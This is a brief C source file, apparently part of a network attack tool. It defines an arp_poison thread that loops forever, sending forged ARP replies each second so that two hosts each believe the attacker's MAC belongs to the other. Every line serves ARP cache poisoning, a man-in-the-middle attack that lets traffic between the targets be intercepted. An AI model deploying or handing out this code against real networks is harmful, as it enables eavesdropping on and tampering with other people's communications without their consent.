#include "../include/arp.h"

// Does arp-poisoning with data supplied from data_pass struct

    gpointer
arp_poison(gpointer arg_ptr) 
{
    struct DataPass *data_pass = (struct DataPass *)arg_ptr;

    while(1) 
    {
        //send a fake arp-reply to target 1 pretending to be target 2
        arp_reply(data_pass->ip2, data_pass->ip1, data_pass->mac1, data_pass->l);
        //send a fake arp-reply to target 2 pretending to be target 1
        arp_reply(data_pass->ip1, data_pass->ip2, data_pass->mac2, data_pass->l);
        sleep(1);
    }
}
